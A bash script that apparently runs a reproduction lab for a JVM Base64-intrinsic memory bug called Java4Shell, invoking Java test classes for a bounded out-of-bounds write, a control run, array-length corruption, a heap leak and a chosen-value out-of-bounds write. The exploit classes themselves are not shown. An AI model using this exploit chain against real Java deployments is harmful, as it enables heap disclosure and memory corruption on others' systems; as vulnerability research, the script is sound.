#!/usr/bin/env bash
# Java4Shell (CVE-2026-114938) lab runner.
#
# Usage: run-lab [trigger|control|corrupt|leak|write|all]
#
#   trigger  bounded, non-destructive OOB-write measurement
#   control  same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
#   corrupt  overwrite a neighbouring array's length + OOB read
#   leak     JavaBleed-style heap disclosure (marker in a neighbour array)
#   write    use the corrupted length for a chosen-value OOB write
#   all      run all five (default)
#
# Environment:
#   LAB_MODE=native|sde|auto   (default auto)
#   LAB_WARMUP=N               (default 1000; use 200000 for a fully warm
#                               decoder without -Xcomp on real hardware)

set -uo pipefail

MODE="${LAB_MODE:-auto}"
TEST="${1:-all}"
WARMUP="${LAB_WARMUP:-1000}"
CLASSES=/opt/lab/classes
SDE=/opt/sde/sde64

JVM_OPTS=(-Xcomp -XX:-TieredCompilation)
EXTRA_OPTS=()

cpu_has_avx512() {
    # All four are required by the vulnerable decoder.
    [ "$(uname -m)" = "x86_64" ] || return 1
    for f in avx512f avx512bw avx512vbmi bmi2; do
        grep -qw "$f" /proc/cpuinfo || return 1
    done
    return 0
}

case "$MODE" in
    native)
        RUNNER=(java)
        ;;
    sde)
        RUNNER=("$SDE" -chip_check_disable -icx -- java)
        ;;
    auto)
        if cpu_has_avx512; then
            RUNNER=(java)
            MODE=native
        else
            RUNNER=("$SDE" -chip_check_disable -icx -- java)
            MODE=sde
        fi
        ;;
    *)
        echo "LAB_MODE must be native, sde or auto" >&2
        exit 2
        ;;
esac

RUNNER_NAME="${RUNNER[0]##*/}"

run() {
    local cls="$1"
    shift
    "${RUNNER[@]}" "${JVM_OPTS[@]}" "${EXTRA_OPTS[@]}" -cp "$CLASSES" "$cls" "$@"
}

banner() {
    echo
    echo "==================================================================="
    echo " $1"
    echo " runner=$RUNNER_NAME  mode=$MODE  warmup=$WARMUP"
    echo "==================================================================="
}

do_trigger() {
    EXTRA_OPTS=()
    banner "bounded trigger (real 64-byte masked store)"
    run Base64Trigger --warmup "$WARMUP" --show-bytes
}

do_control() {
    EXTRA_OPTS=(-XX:-UseBASE64Intrinsics)
    banner "control: -XX:-UseBASE64Intrinsics"
    run Base64Trigger --warmup "$WARMUP" --show-bytes
}

do_corrupt() {
    EXTRA_OPTS=()
    banner "heap corruption: victim array length + OOB read"
    run HeapCorruption --warmup "$WARMUP" --dst-size 66 --show-length --oob-index 4096
}

do_leak() {
    EXTRA_OPTS=()
    banner "JavaBleed: read a neighbouring secret array"
    run HeapLeak --warmup "$WARMUP" --scan 8192
}

do_write() {
    EXTRA_OPTS=()
    banner "heap read/write: chosen-value OOB write into a neighbour"
    run HeapWrite --warmup "$WARMUP"
}

case "$TEST" in
    trigger) do_trigger ;;
    control) do_control ;;
    corrupt) do_corrupt ;;
    leak)    do_leak ;;
    write)   do_write ;;
    all)
        do_trigger; echo "[trigger] exit=$?"
        do_control; echo "[control] exit=$?"
        do_corrupt; echo "[corrupt] exit=$?"
        do_leak;    echo "[leak]    exit=$?"
        do_write;   echo "[write]   exit=$?"
        echo
        echo "Done. Expected: trigger=REPRODUCED, control=NOT REPRODUCED,"
        echo "corrupt=OOB READ REPRODUCED, leak=JAVA BLEED REPRODUCED,"
        echo "write=OOB WRITE REPRODUCED."
        ;;
    *)
        echo "usage: $0 [trigger|control|corrupt|leak|write|all]" >&2
        exit 2
        ;;
esac
